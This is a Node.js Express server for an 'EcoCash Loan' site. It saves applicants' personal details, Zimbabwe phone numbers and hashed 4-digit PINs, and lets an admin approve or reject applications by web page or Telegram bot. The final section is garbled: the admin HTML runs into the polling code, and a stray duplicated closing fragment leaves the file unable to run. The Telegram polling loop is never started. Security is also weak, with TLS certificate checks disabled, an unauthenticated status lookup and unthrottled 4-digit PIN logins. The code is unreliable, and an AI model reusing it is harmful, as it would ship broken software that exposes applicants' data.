const express = require('express');
const path = require('path');
const crypto = require('crypto');
const { Pool } = require('pg');

const app = express();
const PORT = process.env.PORT || 10000;
const ADMIN_USER = process.env.ADMIN_USER;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;
const ADMIN_USER_ID = process.env.TELEGRAM_ADMIN_USER_ID;

if (!process.env.DATABASE_URL) console.warn('DATABASE_URL is not set.');
if (!ADMIN_USER || !ADMIN_PASSWORD) console.warn('Set ADMIN_USER and ADMIN_PASSWORD.');
if (!BOT_TOKEN || !ADMIN_CHAT_ID) console.warn('Telegram alerts/actions are not live until Telegram bot secrets are configured.');

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DATABASE_URL ? { rejectUnauthorized: false } : false
});

app.use(express.json({ limit: '100kb' }));
app.use(express.static(path.join(__dirname, 'public')));

const schema = `
CREATE TABLE IF NOT EXISTS applications (
  id UUID PRIMARY KEY,
  loan_type TEXT NOT NULL,
  loan_amount NUMERIC NOT NULL,
  loan_term TEXT NOT NULL,
  purpose TEXT NOT NULL,
  first_name TEXT NOT NULL,
  last_name TEXT NOT NULL,
  email TEXT NOT NULL,
  phone TEXT NOT NULL,
  employment_status TEXT NOT NULL,
  annual_income NUMERIC NOT NULL,
  status TEXT NOT NULL DEFAULT 'pending',
  otp_status TEXT NOT NULL DEFAULT 'not_required',
  pin_hash TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  otp_verified_at TIMESTAMPTZ,
  reviewed_at TIMESTAMPTZ
);
`;

const dbReady = pool.query(schema).then(async () => {
  await pool.query("ALTER TABLE applications ADD COLUMN IF NOT EXISTS otp_status TEXT NOT NULL DEFAULT 'not_required'");
  await pool.query("ALTER TABLE applications ADD COLUMN IF NOT EXISTS otp_verified_at TIMESTAMPTZ");
  await pool.query("ALTER TABLE applications ADD COLUMN IF NOT EXISTS reviewed_at TIMESTAMPTZ");
  await pool.query("UPDATE applications SET otp_status='not_required' WHERE otp_status='pending' OR otp_status='sent'");
}).catch(e => {
  console.error('Database schema setup failed:', e.message);
  throw e;
});

function normalizePhone(value) {
  const x = String(value || '').replace(/[\s()-]/g, '');
  if (/^07\d{8}$/.test(x)) return '+263' + x.slice(1);
  if (/^7\d{8}$/.test(x)) return '+263' + x;
  if (/^\+2637\d{8}$/.test(x)) return x;
  if (/^2637\d{8}$/.test(x)) return '+' + x;
  return null;
}

function hashPin(pin) {
  const salt = crypto.randomBytes(16).toString('hex');
  const derived = crypto.scryptSync(pin, salt, 64).toString('hex');
  return `${salt}:${derived}`;
}

function verifyPin(pin, stored) {
  if (!stored || !stored.includes(':')) return false;
  const [salt, expectedHex] = stored.split(':');
  const actual = crypto.scryptSync(pin, salt, 64);
  const expected = Buffer.from(expectedHex, 'hex');
  return expected.length === actual.length && crypto.timingSafeEqual(actual, expected);
}

function adminAuth(req, res, next) {
  const h = req.headers.authorization || '';
  if (!h.startsWith('Basic ') || !ADMIN_USER || !ADMIN_PASSWORD) {
    return res.status(401).set('WWW-Authenticate', 'Basic realm="Loan Admin"').json({ error: 'Admin authentication required.' });
  }
  let raw = '';
  try { raw = Buffer.from(h.slice(6), 'base64').toString(); } catch {}
  const i = raw.indexOf(':');
  const user = raw.slice(0, i), pass = raw.slice(i + 1);
  if (user !== ADMIN_USER || pass !== ADMIN_PASSWORD) {
    return res.status(401).set('WWW-Authenticate', 'Basic realm="Loan Admin"').json({ error: 'Invalid admin credentials.' });
  }
  next();
}

async function telegramApi(method, body) {
  if (!BOT_TOKEN) return null;
  const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  });
  const data = await response.json().catch(() => ({}));
  if (!response.ok || !data.ok) throw new Error(`Telegram ${method} failed: ${data.description || response.status}`);
  return data.result;
}

async function sendTelegram(chatId, text, keyboard) {
  if (!BOT_TOKEN || !chatId) return;
  try {
    await telegramApi('sendMessage', {
      chat_id: chatId,
      text,
      ...(keyboard ? { reply_markup: { inline_keyboard: keyboard } } : {})
    });
  } catch (e) {
    console.error('Telegram message failed:', e.message);
  }
}

async function notifyTelegram(text, keyboard) {
  if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
    console.warn('Telegram notification skipped: bot token or admin chat ID is missing.');
    return;
  }
  await sendTelegram(ADMIN_CHAT_ID, text, keyboard);
}

async function setApplicationStatus(id, status, source = 'admin') {
  if (!['approved', 'rejected'].includes(status)) throw new Error('Invalid status');
  const result = await pool.query(
    'UPDATE applications SET status=$1, reviewed_at=NOW() WHERE id=$2 RETURNING id,status,phone,first_name,last_name',
    [status, id]
  );
  if (!result.rows[0]) return null;
  const row = result.rows[0];
  await notifyTelegram(`Application ${status.toUpperCase()}\nID: ${row.id}\nApplicant: ${row.first_name} ${row.last_name}\nPhone: ${row.phone}\nUpdated by: ${source}`);
  return row;
}

app.get('/api/health', async (req, res) => {
  try {
    await dbReady;
    await pool.query('SELECT 1');
    res.json({ ok: true, database: 'connected', sms: 'disabled' });
  } catch {
    res.status(503).json({ ok: false, database: 'unavailable' });
  }
});

// Save application and notify Telegram. No Twilio or SMS is called.
app.post('/api/applications', async (req, res) => {
  try {
    await dbReady;
    const b = req.body || {};
    const phone = normalizePhone(b.phone);
    const amount = Number(b.loanAmount);
    const income = Number(b.annualIncome);
    const required = ['loanType','loanTerm','purpose','firstName','lastName','email','employmentStatus'];

    if (required.some(k => !String(b[k] || '').trim()) || !phone ||
        !Number.isFinite(amount) || !Number.isFinite(income)) {
      return res.status(400).json({ error: 'Please complete all application fields correctly.' });
    }
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(b.email))) {
      return res.status(400).json({ error: 'Invalid email address.' });
    }
    if (amount <= 0 || amount > 500000 || income <= 0) {
      return res.status(400).json({ error: 'Enter valid loan and income amounts.' });
    }

    const id = crypto.randomUUID();
    await pool.query(
      `INSERT INTO applications
       (id,loan_type,loan_amount,loan_term,purpose,first_name,last_name,email,phone,employment_status,annual_income,status,otp_status)
       VALUES($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,'pending','not_required')`,
      [id, String(b.loanType).slice(0,80), amount, String(b.loanTerm).slice(0,40),
       String(b.purpose).slice(0,1000), String(b.firstName).slice(0,100),
       String(b.lastName).slice(0,100), String(b.email).slice(0,200), phone,
       String(b.employmentStatus).slice(0,80), income]
    );

    await notifyTelegram(
      `New loan application — awaiting review\nID: ${id}\nApplicant: ${String(b.firstName).slice(0,100)} ${String(b.lastName).slice(0,100)}\nPhone: ${phone}\nLoan type: ${String(b.loanType).slice(0,80)}\nAmount: USD ${amount}\nTerm: ${String(b.loanTerm).slice(0,40)}\nPurpose: ${String(b.purpose).slice(0,500)}\nEmployment: ${String(b.employmentStatus).slice(0,80)}\nAnnual income: USD ${income}\nPhone verification: not enabled (SMS provider not connected).\nPINs are never sent to Telegram.`,
      [[
        { text: 'Approve', callback_data: `approve:${id}` },
        { text: 'Reject', callback_data: `reject:${id}` }
      ]]
    );

    res.status(201).json({
      id,
      applicationId: id,
      status: 'pending',
      message: 'Application submitted successfully.'
    });
  } catch (e) {
    console.error('Application submission failed:', e.message);
    res.status(500).json({ error: 'Could not save application. Please try again.' });
  }
});

// Customer creates a PIN after applying.
// Phone + application ID alone do not prove phone ownership.
app.post('/api/pin/setup', async (req, res) => {
  try {
    await dbReady;
    const id = String(req.body?.applicationId || req.body?.id || '');
    const phone = normalizePhone(req.body?.phone);
    const pin = String(req.body?.pin || '');

    if (!/^[0-9a-f-]{36}$/i.test(id) || !phone || !/^\d{4}$/.test(pin)) {
      return res.status(400).json({
        error: 'Application ID, valid phone number, and 4-digit PIN are required.'
      });
    }

    const r = await pool.query(
      'SELECT id,phone,pin_hash FROM applications WHERE id=$1',
      [id]
    );
    const row = r.rows[0];

    if (!row || row.phone !== phone) {
      return res.status(404).json({ error: 'Application details did not match.' });
    }
    if (row.pin_hash) {
      return res.status(409).json({ error: 'A PIN has already been created for this application.' });
    }

    await pool.query('UPDATE applications SET pin_hash=$1 WHERE id=$2', [hashPin(pin), id]);
    res.json({
      saved: true,
      message: 'PIN created. You can now log in and check your application status.'
    });
  } catch (e) {
    console.error('PIN setup failed:', e.message);
    res.status(500).json({ error: 'Could not save PIN.' });
  }
});

app.post('/api/login', async (req, res) => {
  try {
    await dbReady;
    const phone = normalizePhone(req.body?.phone);
    const pin = String(req.body?.pin || '');

    if (!phone || !/^\d{4}$/.test(pin)) {
      return res.status(400).json({ error: 'Enter a valid Zimbabwe phone number and 4-digit PIN.' });
    }

    const r = await pool.query(
      'SELECT id,phone,status,pin_hash FROM applications WHERE phone=$1 ORDER BY created_at DESC LIMIT 1',
      [phone]
    );
    const row = r.rows[0];

    if (!row) return res.status(401).json({ error: 'No application account found for this number.' });
    if (!row.pin_hash) return res.status(401).json({ error: 'Create your PIN first using your application ID.' });
    if (!verifyPin(pin, row.pin_hash)) return res.status(401).json({ error: 'Incorrect PIN.' });

    if (row.status === 'rejected') {
      return res.status(403).json({
        status: 'rejected',
        message: 'Your application was not approved. Please contact support.'
      });
    }

    if (row.status !== 'approved') {
      return res.json({
        authenticated: true,
        status: 'pending',
        message: 'Your application is awaiting admin approval.'
      });
    }

    return res.json({
      authenticated: true,
      status: 'approved',
      message: 'Login successful. Your application is approved.'
    });
  } catch (e) {
    console.error('Login failed:', e.message);
    res.status(500).json({ error: 'Login unavailable.' });
  }
});

app.get('/api/applications/:id/status', async (req, res) => {
  try {
    await dbReady;
    const r = await pool.query(
      'SELECT id,status,otp_status FROM applications WHERE id=$1',
      [req.params.id]
    );
    if (!r.rows[0]) return res.status(404).json({ error: 'Application not found.' });
    res.json(r.rows[0]);
  } catch {
    res.status(500).json({ error: 'Status unavailable.' });
  }
});

app.get('/api/admin/applications', adminAuth, async (req, res) => {
  try {
    await dbReady;
    const r = await pool.query(
      'SELECT id,loan_type,loan_amount,loan_term,purpose,first_name,last_name,email,phone,employment_status,annual_income,status,otp_status,created_at,reviewed_at FROM applications ORDER BY created_at DESC'
    );
    res.json(r.rows);
  } catch {
    res.status(500).json({ error: 'Could not load applications.' });
  }
});

app.patch('/api/admin/applications/:id', adminAuth, async (req, res) => {
  try {
    const status = req.body?.status;
    if (!['approved','rejected'].includes(status)) {
      return res.status(400).json({ error: 'Status must be approved or rejected.' });
    }
    const row = await setApplicationStatus(req.params.id, status, 'web admin');
    if (!row) return res.status(404).json({ error: 'Application not found.' });
    res.json({ id: row.id, status: row.status });
  } catch {
    res.status(500).json({ error: 'Could not update application.' });
  }
});

app.get('/admin', adminAuth, (req, res) => res.type('html').send(`<!doctype html>
<html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>EcoCash Loan Admin</title>
<style>
body{font-family:Arial,sans-serif;margin:0;padding:18px;background:#f2f6fb;color:#152238}
h1{color:#0753a6}.sub{color:#5d6b7e}.card{background:#fff;padding:16px;margin:12px 0;border-radius:12px;box-shadow:0 2px 10px #dce3eb;overflow-wrap:anywhere}
button{padding:10px 14px;border:0;border-radius:7px;margin:5px 5px 0 0;cursor:pointer;font-weight:700}.approve{background:#13834b;color:#fff}.reject{background:#c83737;color:#fff}
.pill{display:inline-block;border-radius:99px;padding:4px 9px;background:#edf2f7;margin:4px 4px 4px 0;font-size:12px}
</style></head><body><h1>EcoCash Loan Applications</h1><p class="sub">Review applications and status. Customer PINs are never displayed here.</p>
<div id="list">Loading applications…</div>
<script>
const esc=s=>String(s??'').replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
async function load(){try{const r=await fetch('/api/admin/applications');if(!r.ok)throw Error('Unable to load. Refresh and sign in again.');const a=await r.json();document.getElementById('list').innerHTML=a.map(x=>'<div class="card"><h3>'+esc(x.first_name)+' '+esc(x.last_name)+'</h3><span class="pill">Application: '+esc(x.status)+'</span><p><b>ID:</b> '+esc(x.id)+'</p><p><b>Phone:</b> '+esc(x.phone)+'<br><b>Email:</b> '+esc(x.email)+'</p><p><b>Loan:</b> '+esc(x.loan_type)+' — USD '+esc(x.loan_amount)+'<br><b>Term:</b> '+esc(x.loan_term)+'<br><b>Purpose:</b> '+esc(x.purpose)+'</p><p><b>Employment:</b> '+esc(x.employment_status)+'<br><b>Annual income:</b> USD '+esc(x.annual_income)+'</p><p><b>Submitted:</b> '+esc(new Date(x.created_at).toLocaleString())+'</p><button class="approve" onclick="setStatus(\\''+x.id+'\\',\\'approved\\')">Approve</button><button class="reject" onclick="setStatus(\\''+x.id+'\\',\\'rejected\\')">Reject</button></div>').join('')||'No applications yet.'}catch(e){document.getElementById('list').textContent=e.message}}
async function setStatus(id,status){if(!confirm('Set this application to '+status+'?'))return;const r=await fetch('/api/admin/applications/'+id,{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify({status})});if(!r.ok){alert('Could not update status.');return}load()}
load();setInterval(load,20000);
</script></body></html>`));let telegramOffset = 0;
let telegramPolling = false;

async function processTelegramUpdate(update) {
  const msg = update.message;
  const query = update.callback_query;
  const chatId = String(msg?.chat?.id ?? query?.message?.chat?.id ?? '');
  const fromId = String(msg?.from?.id ?? query?.from?.id ?? '');

  if (!ADMIN_CHAT_ID || chatId !== String(ADMIN_CHAT_ID) ||
      (ADMIN_USER_ID && fromId !== String(ADMIN_USER_ID))) {
    if (query?.id) {
      try {
        await telegramApi('answerCallbackQuery', {
          callback_query_id: query.id,
          text: 'Not authorized.'
        });
      } catch {}
    }
    return;
  }

  if (query) {
    const match = /^(approve|reject):([0-9a-f-]{36})$/i.exec(query.data || '');
    if (!match) {
      await telegramApi('answerCallbackQuery', {
        callback_query_id: query.id,
        text: 'Unknown action.'
      }).catch(() => {});
      return;
    }

    try {
      const row = await setApplicationStatus(
        match[2],
        match[1] === 'approve' ? 'approved' : 'rejected',
        'Telegram admin'
      );

      await telegramApi('answerCallbackQuery', {
        callback_query_id: query.id,
        text: row ? `Application ${row.status}` : 'Application not found'
      });

      if (row) {
        await telegramApi('editMessageReplyMarkup', {
          chat_id: chatId,
          message_id: query.message.message_id,
          reply_markup: { inline_keyboard: [] }
        }).catch(() => {});
      }
    } catch (e) {
      console.error('Telegram approval action failed:', e.message);
      await telegramApi('answerCallbackQuery', {
        callback_query_id: query.id,
        text: 'Could not update application.'
      }).catch(() => {});
    }
    return;
  }

  const message = String(msg?.text || '').trim();

  if (message === '/start' || message === '/help') {
    await sendTelegram(chatId,
      'EcoCash admin bot is connected. Commands:\n' +
      '/pending — list pending application IDs\n' +
      '/status APPLICATION_ID — show application status\n' +
      '/whoami — show your chat and user IDs.'
    );
  } else if (message === '/pending') {
    const r = await pool.query(
      "SELECT id,first_name,last_name,phone,loan_amount,loan_term FROM applications WHERE status='pending' ORDER BY created_at DESC LIMIT 20"
    );

    if (!r.rows.length) {
      return sendTelegram(chatId, 'No pending applications.');
    }

    for (const x of r.rows) {
      await sendTelegram(
        chatId,
        `Pending application\nID: ${x.id}\nApplicant: ${x.first_name} ${x.last_name}\nPhone: ${x.phone}\nLoan: USD ${x.loan_amount} (${x.loan_term})`,
        [[
          { text: 'Approve', callback_data: `approve:${x.id}` },
          { text: 'Reject', callback_data: `reject:${x.id}` }
        ]]
      );
    }
  } else if (message.startsWith('/status ')) {
    const id = message.split(/\s+/)[1];
    const r = await pool.query(
      'SELECT id,status,phone,first_name,last_name FROM applications WHERE id=$1',
      [id]
    );
    const x = r.rows[0];

    await sendTelegram(chatId, x
      ? `Application status\nID: ${x.id}\nApplicant: ${x.first_name} ${x.last_name}\nPhone: ${x.phone}\nStatus: ${x.status}`
      : 'Application not found.'
    );
  } else if (message === '/whoami') {
    await sendTelegram(chatId,
      `Authorized chat ID: ${chatId}\nYour Telegram user ID: ${fromId}`
    );
  }
}

async function telegramPollLoop() {
  if (telegramPolling || !BOT_TOKEN || !ADMIN_CHAT_ID) return;
  telegramPolling = true;

  while (true) {
    try {
      const result = await telegramApi('getUpdates', {
        offset: telegramOffset,
        timeout: 20,
        allowed_updates: ['message', 'callback_query']
      });

      for (const update of result || []) {
        telegramOffset = Math.max(telegramOffset, update.update_id + 1);
        try {
          await processTelegramUpdate(update);
        } catch (e) {
          console.error('Telegram update failed:', e.message);
        }
      }
    } catch (e) {
      console.error('Telegram polling issue:', e.message);
      await new Promise(resolve => setTimeout(resolve, 4000));
    }
  }
}

app.listen(PORT, async () => {
  console.log('EcoCash application service listening on ' + PORT);
  try {
    await dbReady;
  } catch {}
  </script></body></html>`));
});
